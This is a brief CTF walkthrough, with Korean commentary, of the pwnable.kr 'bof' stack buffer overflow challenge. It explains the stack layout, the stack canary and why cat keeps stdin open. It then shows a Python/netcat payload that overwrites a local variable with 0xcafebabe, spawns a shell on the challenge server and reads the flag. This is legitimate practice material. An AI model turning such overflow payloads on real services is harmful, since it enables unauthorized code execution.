Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

* 기초적인 buffer overflow 문제
* 그냥 생각해 보면 32 byte - old ebp - return address - argument 순으로 되어 있을것 같지만 해보면 stack smashing detector 같은것도 있고 해서 좀 더 많이 overflow 해야 한다

~~~
vmware@ubuntu:~$ (python -c "print '\xbe\xba\xfe\xca'*11" ; cat) | nc pwnable.kr 9000
*** stack smashing detected ***: /home/bof/bof terminated
overflow me : 
Nah..
~~~

* cat을 넣어야 하는 이유는, linux의 pipe는 주어진 input이 끝나면 자동으로 stdin으로 전환해 주는게 아니라 그냥 더 이상 들어갈게 없다고 생각하고 input을 받는 프로세스를 종료시켜 버린다. 그래서 뒤에 cat을 넣어줘서 python print 이후에도 cat을 통한 stdin이 있을것임을 보여주는 것이다. 

~~~
vmware@ubuntu:~$ (python -c "print '\xbe\xba\xfe\xca'*14" ; cat) | nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
~~~